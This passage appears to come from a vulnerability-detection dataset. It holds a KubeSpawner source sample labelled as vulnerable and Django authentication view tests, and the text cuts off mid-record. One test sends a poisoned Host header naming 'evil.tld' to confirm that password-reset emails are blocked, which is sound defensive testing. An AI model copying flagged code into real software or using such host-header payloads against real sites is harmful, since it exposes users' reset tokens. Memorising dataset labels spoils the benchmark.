'--{}'.format(escapism.escape(self.name, safe=safe_chars, escape_char='-').lower())\n        else:\n            servername = ''\n            safe_servername = ''\n\n        legacy_escaped_username = ''.join([s if s in safe_chars else '-' for s in self.user.name.lower()])\n        safe_username = escapism.escape(self.user.name, safe=safe_chars, escape_char='-').lower()\n        return template.format(\n            userid=self.user.id,\n            username=safe_username,\n            unescaped_username=self.user.name,\n            legacy_escape_username=legacy_escaped_username,\n            servername=safe_servername,\n            unescaped_servername=servername,\n        )\n\n    def _expand_all(self, src):\n        if isinstance(src, list):\n            return [self._expand_all(i) for i in src]\n        elif isinstance(src, dict):\n            return {k: self._expand_all(v) for k, v in src.items()}\n        elif isinstance(src, str):\n            return self._expand_user_properties(src)\n        else:\n            return src\n\n    def _build_common_labels(self, extra_labels):\n        # Default set of labels, picked up from\n        # https://github.com/kubernetes/helm/blob/master/docs/chart_best_practices/labels.md\n        labels = {}\n        labels.update(extra_labels)\n        labels.update(self.common_labels)\n        return labels\n\n    def _build_pod_labels(self, extra_labels):\n        labels = self._build_common_labels(extra_labels)\n        labels.update({\n            'component': 'singleuser-server'\n        })\n        return labels\n\n    def _build_common_annotations(self, extra_annotations):\n        # Annotations don't need to be escaped\n        annotations = {\n            'hub.jupyter.org/username': self.user.name\n        }\n        if self.name:\n            annotations['hub.jupyter.org/servername'] = self.name\n\n        annotations.update(extra_annotations)\n        return annotations\n\n    @gen.coroutine\n    def get_pod_manifest(self):\n        \"\"\"\n        Make a pod manifest that will spawn current user's notebook pod.\n        \"\"\"\n        if callable(self.uid):\n            uid = yield gen.maybe_future(self.uid(self))\n        else:\n            uid = self.uid\n\n        if callable(self.gid):\n            gid = yield gen.maybe_future(self.gid(self))\n        else:\n            gid = self.gid\n\n        if callable(self.fs_gid):\n            fs_gid = yield gen.maybe_future(self.fs_gid(self))\n        else:\n            fs_gid = self.fs_gid\n\n        if callable(self.supplemental_gids):\n            supplemental_gids = yield gen.maybe_future(self.supplemental_gids(self))\n        else:\n            supplemental_gids = self.supplemental_gids\n\n        if self.cmd:\n            real_cmd = self.cmd + self.get_args()\n        else:\n            real_cmd = None\n\n        labels = self._build_pod_labels(self._expand_all(self.extra_labels))\n        annotations = self._build_common_annotations(self._expand_all(self.extra_annotations))\n\n        return make_pod(\n            name=self.pod_name,\n            cmd=real_cmd,\n            port=self.port,\n            image=self.image,\n            image_pull_policy=self.image_pull_policy,\n            image_pull_secret=self.image_pull_secrets,\n            node_selector=self.node_selector,\n            run_as_uid=uid,\n            run_as_gid=gid,\n            fs_gid=fs_gid,\n            supplemental_gids=supplemental_gids,\n            run_privileged=self.privileged,\n            env=self.get_env(),\n            volumes=self._expand_all(self.volumes),\n            volume_mounts=self._expand_all(self.volume_mounts),\n            working_dir=self.working_dir,\n            labels=labels,\n            annotations=annotations,\n            cpu_limit=self.cpu_limit,\n            cpu_guarantee=self.cpu_guarantee,\n            mem_limit=self.mem_limit,\n            mem_guarantee=self.mem_guarantee,\n            extra_resource_limits=self.extra_resource_limits,\n            extra_resource_guarantees=self.extra_resource_guarantees,\n            lifecycle_hooks=self.lifecycle_hooks,\n            init_containers=self._expand_all(self.init_containers),\n            service_account=self.service_account,\n            extra_container_config=self.extra_container_config,\n            extra_pod_config=self._expand_all(self.extra_pod_config),\n            extra_containers=self._expand_all(self.extra_containers),\n            scheduler_name=self.scheduler_name,\n            tolerations=self.tolerations,\n            node_affinity_preferred=self.node_affinity_preferred,\n            node_affinity_required=self.node_affinity_required,\n            pod_affinity_preferred=self.pod_affinity_preferred,\n            pod_affinity_required=self.pod_affinity_required,\n            pod_anti_affinity_preferred=self.pod_anti_affinity_preferred,\n            pod_anti_affinity_required=self.pod_anti_affinity_required,\n            priority_class_name=self.priority_class_name,\n            logger=self.log,\n        )\n\n    def get_pvc_manifest(self):\n        \"\"\"\n        Make a pvc manifest that will spawn current user's pvc.\n        \"\"\"\n        labels = self._build_common_labels(self._expand_all(self.storage_extra_labels))\n        labels.update({\n            'component': 'singleuser-storage'\n        })\n\n        annotations = self._build_common_annotations({})\n\n        return make_pvc(\n            name=self.pvc_name,\n            storage_class=self.storage_class,\n            access_modes=self.storage_access_modes,\n            selector=self.storage_selector,\n            storage=self.storage_capacity,\n            labels=labels,\n            annotations=annotations\n        )\n\n    def is_pod_running(self, pod):\n        \"\"\"\n        Check if the given pod is running\n\n        pod must be a dictionary representing a Pod kubernetes API object.\n        \"\"\"\n        # FIXME: Validate if this is really the best way\n        is_running = (\n            pod is not None and\n            pod.status.phase == 'Running' and\n            pod.status.pod_ip is not None and\n            pod.metadata.deletion_timestamp is None and\n            all([cs.ready for cs in pod.status.container_statuses])\n        )\n        return is_running\n\n    def get_state(self):\n        \"\"\"\n        Save state required to reinstate this user's pod from scratch\n\n        We save the `pod_name`, even though we could easily compute it,\n        because JupyterHub requires you save *some* state! Otherwise\n        it assumes your server is dead. This works around that.\n\n        It's also useful for cases when the `pod_template` changes between\n        restarts - this keeps the old pods around.\n        \"\"\"\n        state = super().get_state()\n        state['pod_name'] = self.pod_name\n        return state\n\n    def get_env(self):\n        \"\"\"Return the environment dict to use for the Spawner.\n\n        See also: jupyterhub.Spawner.get_env\n        \"\"\"\n\n        env = super(KubeSpawner, self).get_env()\n        # deprecate image\n        env['JUPYTER_IMAGE_SPEC'] = self.image\n        env['JUPYTER_IMAGE'] = self.image\n\n        return env\n\n    def load_state(self, state):\n        \"\"\"\n        Load state from storage required to reinstate this user's pod\n\n        Since this runs after `__init__`, this will override the generated `pod_name`\n        if there's one we have saved in state. These are the same in most cases,\n        but if the `pod_template` has changed in between restarts, it will no longer\n        be the case. This allows us to continue serving from the old pods with\n        the old names.\n        \"\"\"\n        if 'pod_name' in state:\n            self.pod_name = state['pod_name']\n\n    @gen.coroutine\n    def poll(self):\n        \"\"\"\n        Check if the pod is still running.\n\n        Uses the same interface as subprocess.Popen.poll(): if the pod is\n        still running, returns None.  If the pod has exited, return the\n        exit code if we can determine it, or 1 if it has exited but we\n        don't know how.  These are the return values JupyterHub expects.\n\n        Note that a clean exit will have an exit code of zero, so it is\n        necessary to check that the returned value is None, rather than\n        just Falsy, to determine that the pod is still running.\n        \"\"\"\n        # have to wait for first load of data before we have a valid answer\n        if not self.pod_reflector.first_load_future.done():\n            yield self.pod_reflector.first_load_future\n        data = self.pod_reflector.pods.get(self.pod_name, None)\n        if data is not None:\n            if data.status.phase == 'Pending':\n                return None\n            ctr_stat = data.status.container_statuses\n            if ctr_stat is None:  # No status, no container (we hope)\n                # This seems to happen when a pod is idle-culled.\n                return 1\n            for c in ctr_stat:\n                # return exit code if notebook container has terminated\n                if c.name == 'notebook':\n                    if c.state.terminated:\n                        # call self.stop to delete the pod\n                        if self.delete_stopped_pods:\n                            yield self.stop(now=True)\n                        return c.state.terminated.exit_code\n                    break\n            # None means pod is running or starting up\n            return None\n        # pod doesn't exist or has been deleted\n        return 1\n\n    @run_on_executor\n    def asynchronize(self, method, *args, **kwargs):\n        return method(*args, **kwargs)\n\n    @property\n    def events(self):\n        \"\"\"Filter event-reflector to just this pods events\n\n        Returns list of all events that match our pod_name\n        since our ._last_event (if defined).\n        ._last_event is set at the beginning of .start().\n        \"\"\"\n        if not self.event_reflector:\n            return []\n\n        events = []\n        for event in self.event_reflector.events:\n            if event.involved_object.name != self.pod_name:\n                # only consider events for my pod name\n                continue\n\n            if self._last_event and event.metadata.uid == self._last_event:\n                # saw last_event marker, ignore any previous events\n                # and only consider future events\n                # only include events *after* our _last_event marker\n                events = []\n            else:\n                events.append(event)\n        return events\n\n    @async_generator\n    async def progress(self):\n        \"\"\"\n        This function is reporting back the progress of spawning a pod until\n        self._start_future has fired.\n\n        This is working with events parsed by the python kubernetes client,\n        and here is the specification of events that is relevant to understand:\n        ref: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.16/#event-v1-core\n        \"\"\"\n        if not self.events_enabled:\n            return\n\n        self.log.debug('progress generator: %s', self.pod_name)\n        start_future = self._start_future\n        pod_id = None\n        progress = 0\n        next_event = 0\n\n        break_while_loop = False\n        while True:\n            # Ensure we always capture events following the start_future\n            # signal has fired.\n            if start_future.done():\n                break_while_loop = True\n            events = self.events\n\n            len_events = len(events)\n            if next_event < len_events:\n                # only show messages for the 'current' pod\n                # pod_id may change if a previous pod is being stopped\n                # before starting a new one\n                # use the uid of the latest event to identify 'current'\n                pod_id = events[-1].involved_object.uid\n                for i in range(next_event, len_events):\n                    event = events[i]\n                    # move the progress bar.\n                    # Since we don't know how many events we will get,\n                    # asymptotically approach 90% completion with each event.\n                    # each event gets 33% closer to 90%:\n                    # 30 50 63 72 78 82 84 86 87 88 88 89\n                    progress += (90 - progress) / 3\n\n                    # V1Event isn't serializable, and neither is the datetime\n                    # objects within it, and we need what we pass back to be\n                    # serializable to it can be sent back from JupyterHub to\n                    # a browser wanting to display progress.\n                    serializable_event = json.loads(\n                        json.dumps(event.to_dict(), default=datetime.isoformat)\n                    )\n                    await yield_({\n                        'progress': int(progress),\n                        'raw_event': serializable_event,\n                        'message':  \"%s [%s] %s\" % (\n                            event.last_timestamp or event.event_time,\n                            event.type,\n                            event.message,\n                        )\n                    })\n                next_event = len_events\n\n            if break_while_loop:\n                break\n            await sleep(1)\n\n    def _start_reflector(self, key, ReflectorClass, replace=False, **kwargs):\n        \"\"\"Start a shared reflector on the KubeSpawner class\n\n\n        key: key for the reflector (e.g. 'pod' or 'events')\n        Reflector: Reflector class to be instantiated\n        kwargs: extra keyword-args to be relayed to ReflectorClass\n\n        If replace=False and the pod reflector is already running,\n        do nothing.\n\n        If replace=True, a running pod reflector will be stopped\n        and a new one started (for recovering from possible errors).\n        \"\"\"\n        main_loop = IOLoop.current()\n        def on_reflector_failure():\n            self.log.critical(\n                \"%s reflector failed, halting Hub.\",\n                key.title(),\n            )\n            sys.exit(1)\n\n        previous_reflector = self.__class__.reflectors.get(key)\n\n        if replace or not previous_reflector:\n            self.__class__.reflectors[key] = ReflectorClass(\n                parent=self,\n                namespace=self.namespace,\n                on_failure=on_reflector_failure,\n                **kwargs,\n            )\n\n        if replace and previous_reflector:\n            # we replaced the reflector, stop the old one\n            previous_reflector.stop()\n\n        # return the current reflector\n        return self.__class__.reflectors[key]\n\n\n    def _start_watching_events(self, replace=False):\n        \"\"\"Start the events reflector\n\n        If replace=False and the event reflector is already running,\n        do nothing.\n\n        If replace=True, a running pod reflector will be stopped\n        and a new one started (for recovering from possible errors).\n        \"\"\"\n        return self._start_reflector(\n            \"events\",\n            EventReflector,\n            fields={\"involvedObject.kind\": \"Pod\"},\n            replace=replace,\n        )\n\n    def _start_watching_pods(self, replace=False):\n        \"\"\"Start the pod reflector\n\n        If replace=False and the pod reflector is already running,\n        do nothing.\n\n        If replace=True, a running pod reflector will be stopped\n        and a new one started (for recovering from possible errors).\n        \"\"\"\n        return self._start_reflector(\"pods\", PodReflector, replace=replace)\n\n    # record a future for the call to .start()\n    # so we can use it to terminate .progress()\n    def start(self):\n        \"\"\"Thin wrapper around self._start\n\n        so we can hold onto a reference for the Future\n        start returns, which we can use to terminate\n        .progress()\n        \"\"\"\n        self._start_future = self._start()\n        return self._start_future\n\n    _last_event = None\n\n    @gen.coroutine\n    def _start(self):\n        \"\"\"Start the user's pod\"\"\"\n\n        # load user options (including profile)\n        yield self.load_user_options()\n\n        # record latest event so we don't include old\n        # events from previous pods in self.events\n        # track by order and name instead of uid\n        # so we get events like deletion of a previously stale\n        # pod if it's part of this spawn process\n        events = self.events\n        if events:\n            self._last_event = events[-1].metadata.uid\n\n        if self.storage_pvc_ensure:\n            # Try and create the pvc. If it succeeds we are good. If\n            # returns a 409 indicating it already exists we are good. If\n            # it returns a 403, indicating potential quota issue we need\n            # to see if pvc already exists before we decide to raise the\n            # error for quota being exceeded. This is because quota is\n            # checked before determining if the PVC needed to be\n            # created.\n\n            pvc = self.get_pvc_manifest()\n\n            try:\n                yield self.asynchronize(\n                    self.api.create_namespaced_persistent_volume_claim,\n                    namespace=self.namespace,\n                    body=pvc\n                )\n            except ApiException as e:\n                if e.status == 409:\n                    self.log.info(\"PVC \" + self.pvc_name + \" already exists, so did not create new pvc.\")\n\n                elif e.status == 403:\n                    t, v, tb = sys.exc_info()\n\n                    try:\n                        yield self.asynchronize(\n                            self.api.read_namespaced_persistent_volume_claim,\n                            name=self.pvc_name,\n                            namespace=self.namespace)\n\n                    except ApiException as e:\n                        raise v.with_traceback(tb)\n\n                    self.log.info(\"PVC \" + self.pvc_name + \" already exists, possibly have reached quota though.\")\n\n                else:\n                    raise\n\n        # If we run into a 409 Conflict error, it means a pod with the\n        # same name already exists. We stop it, wait for it to stop, and\n        # try again. We try 4 times, and if it still fails we give up.\n        # FIXME: Have better / cleaner retry logic!\n        retry_times = 4\n        pod = yield self.get_pod_manifest()\n        if self.modify_pod_hook:\n            pod = yield gen.maybe_future(self.modify_pod_hook(self, pod))\n        for i in range(retry_times):\n            try:\n                yield self.asynchronize(\n                    self.api.create_namespaced_pod,\n                    self.namespace,\n                    pod,\n                )\n                break\n            except ApiException as e:\n                if e.status != 409:\n                    # We only want to handle 409 conflict errors\n                    self.log.exception(\"Failed for %s\", pod.to_str())\n                    raise\n                self.log.info('Found existing pod %s, attempting to kill', self.pod_name)\n                # TODO: this should show up in events\n                yield self.stop(True)\n\n                self.log.info('Killed pod %s, will try starting singleuser pod again', self.pod_name)\n        else:\n            raise Exception(\n                'Can not create user pod %s already exists & could not be deleted' % self.pod_name)\n\n        # we need a timeout here even though start itself has a timeout\n        # in order for this coroutine to finish at some point.\n        # using the same start_timeout here\n        # essentially ensures that this timeout should never propagate up\n        # because the handler will have stopped waiting after\n        # start_timeout, starting from a slightly earlier point.\n        try:\n            yield exponential_backoff(\n                lambda: self.is_pod_running(self.pod_reflector.pods.get(self.pod_name, None)),\n                'pod/%s did not start in %s seconds!' % (self.pod_name, self.start_timeout),\n                timeout=self.start_timeout,\n            )\n        except TimeoutError:\n            if self.pod_name not in self.pod_reflector.pods:\n                # if pod never showed up at all,\n                # restart the pod reflector which may have become disconnected.\n                self.log.error(\n                    \"Pod %s never showed up in reflector, restarting pod reflector\",\n                    self.pod_name,\n                )\n                self._start_watching_pods(replace=True)\n            raise\n\n        pod = self.pod_reflector.pods[self.pod_name]\n        self.pod_id = pod.metadata.uid\n        if self.event_reflector:\n            self.log.debug(\n                'pod %s events before launch: %s',\n                self.pod_name,\n                \"\\n\".join(\n                    [\n                        \"%s [%s] %s\" % (event.last_timestamp or event.event_time, event.type, event.message)\n                        for event in self.events\n                    ]\n                ),\n            )\n        return (pod.status.pod_ip, self.port)\n\n    @gen.coroutine\n    def stop(self, now=False):\n        delete_options = client.V1DeleteOptions()\n\n        if now:\n            grace_seconds = 0\n        else:\n            grace_seconds = self.delete_grace_period\n\n        delete_options.grace_period_seconds = grace_seconds\n        self.log.info(\"Deleting pod %s\", self.pod_name)\n        try:\n            yield self.asynchronize(\n                self.api.delete_namespaced_pod,\n                name=self.pod_name,\n                namespace=self.namespace,\n                body=delete_options,\n                grace_period_seconds=grace_seconds,\n            )\n        except ApiException as e:\n            if e.status == 404:\n                self.log.warning(\n                    \"No pod %s to delete. Assuming already deleted.\",\n                    self.pod_name,\n                )\n            else:\n                raise\n        try:\n            yield exponential_backoff(\n                lambda: self.pod_reflector.pods.get(self.pod_name, None) is None,\n                'pod/%s did not disappear in %s seconds!' % (self.pod_name, self.start_timeout),\n                timeout=self.start_timeout,\n            )\n        except TimeoutError:\n            self.log.error(\"Pod %s did not disappear, restarting pod reflector\", self.pod_name)\n            self._start_watching_pods(replace=True)\n            raise\n\n    @default('env_keep')\n    def _env_keep_default(self):\n        return []\n\n    _profile_list = None\n\n    def _render_options_form(self, profile_list):\n        self._profile_list = self._init_profile_list(profile_list)\n        profile_form_template = Environment(loader=BaseLoader).from_string(self.profile_form_template)\n        return profile_form_template.render(profile_list=self._profile_list)\n\n    @gen.coroutine\n    def _render_options_form_dynamically(self, current_spawner):\n        profile_list = yield gen.maybe_future(self.profile_list(current_spawner))\n        profile_list = self._init_profile_list(profile_list)\n        return self._render_options_form(profile_list)\n\n    @default('options_form')\n    def _options_form_default(self):\n        '''\n        Build the form template according to the `profile_list` setting.\n\n        Returns:\n            '' when no `profile_list` has been defined\n            The rendered template (using jinja2) when `profile_list` is defined.\n        '''\n        if not self.profile_list:\n            return ''\n        if callable(self.profile_list):\n            return self._render_options_form_dynamically\n        else:\n            return self._render_options_form(self.profile_list)\n\n    def options_from_form(self, formdata):\n        \"\"\"get the option selected by the user on the form\n\n        This only constructs the user_options dict,\n        it should not actually load any options.\n        That is done later in `.load_user_options()`\n\n        Args:\n            formdata: user selection returned by the form\n\n        To access to the value, you can use the `get` accessor and the name of the html element,\n        for example::\n\n            formdata.get('profile',[0])\n\n        to get the value of the form named \"profile\", as defined in `form_template`::\n\n            <select class=\"form-control\" name=\"profile\"...>\n            </select>\n\n        Returns:\n            user_options (dict): the selected profile in the user_options form,\n                e.g. ``{\"profile\": \"cpus-8\"}``\n        \"\"\"\n        return {\n            'profile': formdata.get('profile', [None])[0]\n        }\n\n    @gen.coroutine\n    def _load_profile(self, slug):\n        \"\"\"Load a profile by name\n\n        Called by load_user_options\n        \"\"\"\n\n        # find the profile\n        default_profile = self._profile_list[0]\n        for profile in self._profile_list:\n            if profile.get('default', False):\n                # explicit default, not the first\n                default_profile = profile\n\n            if profile['slug'] == slug:\n                break\n        else:\n            if slug:\n                # name specified, but not found\n                raise ValueError(\"No such profile: %s. Options include: %s\" % (\n                    slug, ', '.join(p['slug'] for p in self._profile_list)\n                ))\n            else:\n                # no name specified, use the default\n                profile = default_profile\n\n        self.log.debug(\"Applying KubeSpawner override for profile '%s'\", profile['display_name'])\n        kubespawner_override = profile.get('kubespawner_override', {})\n        for k, v in kubespawner_override.items():\n            if callable(v):\n                v = v(self)\n                self.log.debug(\".. overriding KubeSpawner value %s=%s (callable result)\", k, v)\n            else:\n                self.log.debug(\".. overriding KubeSpawner value %s=%s\", k, v)\n            setattr(self, k, v)\n\n    # set of recognised user option keys\n    # used for warning about ignoring unrecognised options\n    _user_option_keys = {'profile',}\n\n    def _init_profile_list(self, profile_list):\n        # generate missing slug fields from display_name\n        for profile in profile_list:\n            if 'slug' not in profile:\n                profile['slug'] = slugify(profile['display_name'])\n\n        return profile_list\n\n    @gen.coroutine\n    def load_user_options(self):\n        \"\"\"Load user options from self.user_options dict\n\n        This can be set via POST to the API or via options_from_form\n\n        Only supported argument by default is 'profile'.\n        Override in subclasses to support other options.\n        \"\"\"\n\n        if self._profile_list is None:\n            if callable(self.profile_list):\n                profile_list = yield gen.maybe_future(self.profile_list(self))\n            else:\n                profile_list = self.profile_list\n\n            self._profile_list = self._init_profile_list(profile_list)\n\n        selected_profile = self.user_options.get('profile', None)\n        if self._profile_list:\n            yield self._load_profile(selected_profile)\n        elif selected_profile:\n            self.log.warning(\"Profile %r requested, but profiles are not enabled\", selected_profile)\n\n        # help debugging by logging any option fields that are not recognized\n        option_keys = set(self.user_options)\n        unrecognized_keys = option_keys.difference(self._user_option_keys)\n        if unrecognized_keys:\n            self.log.warning(\n                \"Ignoring unrecognized KubeSpawner user_options: %s\",\n                \", \".join(\n                    map(\n                        str,\n                        sorted(unrecognized_keys)\n                    )\n                )\n            )\n", "target": 1}
{"idx": 1076, "func": "import os\nimport re\n\nfrom django.conf import global_settings, settings\nfrom django.contrib.sites.models import Site, RequestSite\nfrom django.contrib.auth.models import User\nfrom django.core import mail\nfrom django.core.exceptions import SuspiciousOperation\nfrom django.core.urlresolvers import reverse, NoReverseMatch\nfrom django.http import QueryDict\nfrom django.utils.encoding import force_text\nfrom django.utils.html import escape\nfrom django.utils.http import urlquote\nfrom django.test import TestCase\nfrom django.test.utils import override_settings\n\nfrom django.contrib.auth import SESSION_KEY, REDIRECT_FIELD_NAME\nfrom django.contrib.auth.forms import (AuthenticationForm, PasswordChangeForm,\n                SetPasswordForm, PasswordResetForm)\nfrom django.contrib.auth.tests.utils import skipIfCustomUser\n\n\n@override_settings(\n    LANGUAGES=(\n        ('en', 'English'),\n    ),\n    LANGUAGE_CODE='en',\n    TEMPLATE_LOADERS=global_settings.TEMPLATE_LOADERS,\n    TEMPLATE_DIRS=(\n        os.path.join(os.path.dirname(__file__), 'templates'),\n    ),\n    USE_TZ=False,\n    PASSWORD_HASHERS=('django.contrib.auth.hashers.SHA1PasswordHasher',),\n)\nclass AuthViewsTestCase(TestCase):\n    \"\"\"\n    Helper base class for all the follow test cases.\n    \"\"\"\n    fixtures = ['authtestdata.json']\n    urls = 'django.contrib.auth.tests.urls'\n\n    def login(self, password='password'):\n        response = self.client.post('/login/', {\n            'username': 'testclient',\n            'password': password,\n            })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith(settings.LOGIN_REDIRECT_URL))\n        self.assertTrue(SESSION_KEY in self.client.session)\n\n    def assertContainsEscaped(self, response, text, **kwargs):\n        return self.assertContains(response, escape(force_text(text)), **kwargs)\n\n\n@skipIfCustomUser\nclass AuthViewNamedURLTests(AuthViewsTestCase):\n    urls = 'django.contrib.auth.urls'\n\n    def test_named_urls(self):\n        \"Named URLs should be reversible\"\n        expected_named_urls = [\n            ('login', [], {}),\n            ('logout', [], {}),\n            ('password_change', [], {}),\n            ('password_change_done', [], {}),\n            ('password_reset', [], {}),\n            ('password_reset_done', [], {}),\n            ('password_reset_confirm', [], {\n                'uidb36': 'aaaaaaa',\n                'token': '1111-aaaaa',\n            }),\n            ('password_reset_complete', [], {}),\n        ]\n        for name, args, kwargs in expected_named_urls:\n            try:\n                reverse(name, args=args, kwargs=kwargs)\n            except NoReverseMatch:\n                self.fail(\"Reversal of url named '%s' failed with NoReverseMatch\" % name)\n\n\n@skipIfCustomUser\nclass PasswordResetTest(AuthViewsTestCase):\n\n    def test_email_not_found(self):\n        \"Error is raised if the provided email address isn't currently registered\"\n        response = self.client.get('/password_reset/')\n        self.assertEqual(response.status_code, 200)\n        response = self.client.post('/password_reset/', {'email': 'not_a_real_email@email.com'})\n        self.assertContainsEscaped(response, PasswordResetForm.error_messages['unknown'])\n        self.assertEqual(len(mail.outbox), 0)\n\n    def test_email_found(self):\n        \"Email is sent if a valid email address is provided for password reset\"\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        self.assertTrue(\"http://\" in mail.outbox[0].body)\n        self.assertEqual(settings.DEFAULT_FROM_EMAIL, mail.outbox[0].from_email)\n\n    def test_email_found_custom_from(self):\n        \"Email is sent if a valid email address is provided for password reset when a custom from_email is provided.\"\n        response = self.client.post('/password_reset_from_email/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        self.assertEqual(\"staffmember@example.com\", mail.outbox[0].from_email)\n\n    def test_admin_reset(self):\n        \"If the reset view is marked as being for admin, the HTTP_HOST header is used for a domain override.\"\n        response = self.client.post('/admin_password_reset/',\n            {'email': 'staffmember@example.com'},\n            HTTP_HOST='adminsite.com'\n        )\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        self.assertTrue(\"http://adminsite.com\" in mail.outbox[0].body)\n        self.assertEqual(settings.DEFAULT_FROM_EMAIL, mail.outbox[0].from_email)\n\n    def test_poisoned_http_host(self):\n        \"Poisoned HTTP_HOST headers can't be used for reset emails\"\n        # This attack is based on the way browsers handle URLs. The colon\n        # should be used to separate the port, but if the URL contains an @,\n        # the colon is interpreted as part of a username for login purposes,\n        # making 'evil.com' the request domain. Since HTTP_HOST is used to\n        # produce a meaningful reset URL, we need to be certain that the\n        # HTTP_HOST header isn't poisoned. This is done as a check when get_host()\n        # is invoked, but we check here as a practical consequence.\n        with self.assertRaises(SuspiciousOperation):\n            self.client.post('/password_reset/',\n                {'email': 'staffmember@example.com'},\n                HTTP_HOST='www.example:dr.frankenstein@evil.tld'\n            )\n        self.assertEqual(len(mail.outbox), 0)\n\n    def test_poisoned_http_host_admin_site(self):\n        \"Poisoned HTTP_HOST headers can't be used for reset emails on admin views\"\n        with self.assertRaises(SuspiciousOperation):\n            self.client.post('/admin_password_reset/',\n                {'email': 'staffmember@example.com'},\n                HTTP_HOST='www.example:dr.frankenstein@evil.tld'\n            )\n        self.assertEqual(len(mail.outbox), 0)\n\n    def _test_confirm_start(self):\n        # Start by creating the email\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        return self._read_signup_email(mail.outbox[0])\n\n    def _read_signup_email(self, email):\n        urlmatch = re.search(r\"https?://[^/]*(/.*reset/\\S*)\", email.body)\n        self.assertTrue(urlmatch is not None, \"No URL found in sent email\")\n        return urlmatch.group(), urlmatch.groups()[0]\n\n    def test_confirm_valid(self):\n        url, path = self._test_confirm_start()\n        response = self.client.get(path)\n        # redirect to a 'complete' page:\n        self.assertContains(response, \"Please enter your new password\")\n\n    def test_confirm_invalid(self):\n        url, path = self._test_confirm_start()\n        # Let's munge the token in the path, but keep the same length,\n        # in case the URLconf will reject a different length.\n        path = path[:-5] + (\"0\" * 4) + path[-1]\n\n        response = self.client.get(path)\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_invalid_user(self):\n        # Ensure that we get a 200 response for a non-existant user, not a 404\n        response = self.client.get('/reset/123456-1-1/')\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_overflow_user(self):\n        # Ensure that we get a 200 response for a base36 user id that overflows int\n        response = self.client.get('/reset/zzzzzzzzzzzzz-1-1/')\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_invalid_post(self):\n        # Same as test_confirm_invalid, but trying\n        # to do a POST instead.\n        url, path = self._test_confirm_start()\n        path = path[:-5] + (\"0\" * 4) + path[-1]\n\n        self.client.post(path, {\n            'new_password1': 'anewpassword',\n            'new_password2': ' anewpassword',\n        })\n        # Check the password has not been changed\n        u = User.objects.get(email='staffmember@example.com')\n        self.assertTrue(not u.check_password(\"anewpassword\"))\n\n    def test_confirm_complete(self):\n        url, path = self._test_confirm_start()\n        response = self.client.post(path, {'new_password1': 'anewpassword',\n                                           'new_password2': 'anewpassword'})\n        # It redirects us to a 'complete' page:\n        self.assertEqual(response.status_code, 302)\n        # Check the password has been changed\n        u = User.objects.get(email='staffmember@example.com')\n        self.assertTrue(u.check_password(\"anewpassword\"))\n\n        # Check we can't use the link again\n        response = self.client.get(path)\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_different_passwords(self):\n        url, path = self._test_confirm_start()\n        response = self.client.post(path, {'new_password1': 'anewpassword',\n                                           'new_password2': 'x'})\n        self.assertContainsEscaped(response, SetPasswordForm.error_messages['password_mismatch'])\n\n\n@override_settings(AUTH_USER_MODEL='auth.CustomUser')\nclass CustomUserPasswordResetTest(AuthViewsTestCase):\n    fixtures = ['custom_user.json']\n\n    def _test_confirm_start(self):\n        # Start by creating the email\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        return self._read_signup_email(mail.outbox[0])\n\n    def _read_signup_email(self, email):\n        urlmatch = re.search(r\"https?://[^/]*(/.*reset/\\S*)\", email.body)\n        self.assertTrue(urlmatch is not None, \"No URL found in sent email\")\n        return urlmatch.group(), urlmatch.groups()[0]\n\n    def test_confirm_valid_custom_user(self):\n        url, path = self._test_confirm_start()\n        response = self.client.get(path)\n        # redirect to a 'complete' page:\n        self.assertContains(response, \"Please enter your new password\")\n\n\n@skipIfCustomUser\nclass ChangePasswordTest(AuthViewsTestCase):\n\n    def fail_login(self, password='password'):\n        response = self.client.post('/login/', {\n            'username': 'testclient',\n            'password': password,\n        })\n        self.assertContainsEscaped(response, AuthenticationForm.error_messages['invalid_login'])\n\n    def logout(self):\n        response = self.client.get('/logout/')\n\n    def test_password_change_fails_with_invalid_old_password(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'donuts',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertContainsEscaped(response, PasswordChangeForm.error_messages['password_incorrect'])\n\n    def test_password_change_fails_with_mismatched_passwords(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'donuts',\n        })\n        self.assertContainsEscaped(response, SetPasswordForm.error_messages['password_mismatch'])\n\n    def test_password_change_succeeds(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/password_change/done/'))\n        self.fail_login()\n        self.login(password='password1')\n\n    def test_password_change_done_succeeds(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/password_change/done/'))\n\n    def test_password_change_done_fails(self):\n        with self.settings(LOGIN_URL='/login/'):\n            response = self.client.get('/password_change/done/')\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(response['Location'].endswith('/login/?next=/password_change/done/'))\n\n\n@skipIfCustomUser\nclass LoginTest(AuthViewsTestCase):\n\n    def test_current_site_in_context_after_login(self):\n        response = self.client.get(reverse('django.contrib.auth.views.login'))\n        self.assertEqual(response.status_code, 200)\n        if Site._meta.installed:\n            site = Site.objects.get_current()\n            self.assertEqual(response.context['site'], site)\n            self.assertEqual(response.context['site_name'], site.name)\n        